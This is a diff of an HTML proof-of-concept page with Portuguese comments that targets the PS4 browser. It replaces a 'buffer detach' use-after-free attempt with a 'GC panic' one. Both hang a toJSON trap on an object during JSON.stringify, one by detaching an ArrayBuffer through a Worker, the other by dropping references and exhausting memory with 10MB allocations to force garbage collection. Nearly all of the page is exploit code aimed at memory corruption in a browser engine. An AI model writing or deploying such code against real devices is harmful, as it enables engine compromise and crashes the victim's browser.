@@ -1,82 +1,83 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>PS4 Buffer Detach PoC</title>
+    <title>PS4 GC Panic Attack</title>
     <style>
-        body { background: #200; color: #fff; font-family: monospace; padding: 20px; font-size: 24px; }
-        #log { border: 1px solid #f00; padding: 10px; }
+        body { background: #300; color: #fff; font-family: monospace; padding: 20px; font-size: 24px; }
+        #hud { border: 2px solid #f00; padding: 10px; background: #000; }
     </style>
 </head>
 <body>
-    <h3>POC: BUFFER DETACH (UAF)</h3>
-    <div id="log">Iniciando...</div>
+    <div id="hud">
+        STATUS: <span id="status">PREPARANDO...</span><br>
+        MEMÓRIA: <span id="mem">0 MB</span>
+    </div>
 
     <script>
-        const logDiv = document.getElementById('log');
-        function log(msg) {
-            const div = document.createElement('div');
-            div.innerText = msg;
-            logDiv.appendChild(div);
-        }
+        const status = document.getElementById('status');
+        const memDisp = document.getElementById('mem');
+        let pressure = [];
 
-        async function runDetachExploit() {
-            log("1. Criando Vítima (TypedArray)...");
-            
-            // Cria um buffer de memória real
-            const buffer = new ArrayBuffer(1024 * 16); // 16KB
-            const view = new Uint32Array(buffer);
-            
-            // Preenche com dados para o JSON ter o que ler
-            for(let i=0; i<view.length; i++) view[i] = 0x41414141;
-            
-            // O objeto que será serializado
-            // Colocamos o 'view' DEPOIS de um gatilho
-            const target = {
-                a: { 
-                    toJSON: () => {
-                        log(">>> ARMADILHA: DETACHING BUFFER! <<<");
-                        
-                        // AQUI É O GOLPE:
-                        // Transferimos o buffer para um worker.
-                        // Isso torna o buffer 'neutered' (tamanho 0, ponteiro nulo) na thread principal
-                        // Mas o JSON.stringify C++ talvez ainda tenha o ponteiro antigo.
-                        try {
-                            const worker = new Worker(URL.createObjectURL(new Blob([""], {type: "text/javascript"})));
-                            worker.postMessage(buffer, [buffer]);
-                            worker.terminate();
-                            
-                            if (buffer.byteLength === 0) {
-                                log("SUCESSO: Buffer desconectado (Size: 0)!");
-                            } else {
-                                log("FALHA: Não conseguiu desconectar.");
-                            }
-                        } catch(e) {
-                            log("Erro no Detach: " + e.message);
-                        }
-                        
-                        return "trap_executed";
-                    }
-                },
-                b: view // O motor vai tentar ler isso LOGO APÓS a armadilha
-            };
-
-            log("2. Disparando JSON.stringify...");
-            await new Promise(r => setTimeout(r, 500));
-
+        // Função para comer memória RAM rapidamente
+        function eatMemory() {
             try {
-                // Se o motor não checar se o buffer foi desconectado entre 'a' e 'b',
-                // ele vai ler memória morta -> CRASH.
-                JSON.stringify(target);
-                log("3. Sobreviveu (O motor checou o estado do buffer)");
-            } catch(e) {
-                log("Erro capturado: " + e.message);
-                if (e.message.includes("detached") || e.name === "TypeError") {
-                    log("RESULTADO: O navegador bloqueou o acesso (Safe).");
+                for(let i=0; i<1000; i++) {
+                    // Aloca blocos de 10MB
+                    pressure.push(new ArrayBuffer(1024 * 1024 * 10));
                 }
+            } catch(e) {
+                // Memória cheia, o GC deve rodar agora
+                pressure = []; // Solta tudo
             }
         }
 
-        setTimeout(runDetachExploit, 1000);
+        function runExploit() {
+            status.innerText = "ARMANDO A BOMBA...";
+            
+            // Objeto Vítima
+            // Usamos uma estrutura complexa para confundir o GC
+            let root = { 
+                a: { 
+                    // O Gatilho
+                    toJSON: function() {
+                        status.innerText = ">>> GC PANIC INICIADO <<<";
+                        status.style.color = "red";
+                        
+                        // 1. Remove a ÚNICA referência que segura este objeto
+                        // Agora o objeto 'root' é lixo tecnicamente, 
+                        // MAS o JSON.stringify ainda está "em cima" dele na pilha C++
+                        globalRoot = null; 
+                        
+                        // 2. Força pressão extrema de memória para acordar o GC
+                        // O GC vai tentar limpar o 'root' porque não tem referências
+                        eatMemory();
+                        eatMemory();
+                        
+                        return "trap";
+                    }
+                },
+                b: new Uint8Array(1024).fill(0x41) // O alvo do UAF
+            };
+
+            // Salva referência global
+            window.globalRoot = root;
+
+            setTimeout(() => {
+                status.innerText = "DISPARANDO...";
+                try {
+                    // Inicia a serialização
+                    JSON.stringify(window.globalRoot);
+                    
+                    // Se chegar aqui, falhou
+                    status.innerText = "FALHA: O GC foi inteligente e não deletou o objeto ativo.";
+                    status.style.color = "yellow";
+                } catch(e) {
+                    status.innerText = "ERRO: " + e.message;
+                }
+            }, 500);
+        }
+
+        setTimeout(runExploit, 1000);
     </script>
 </body>
 </html>
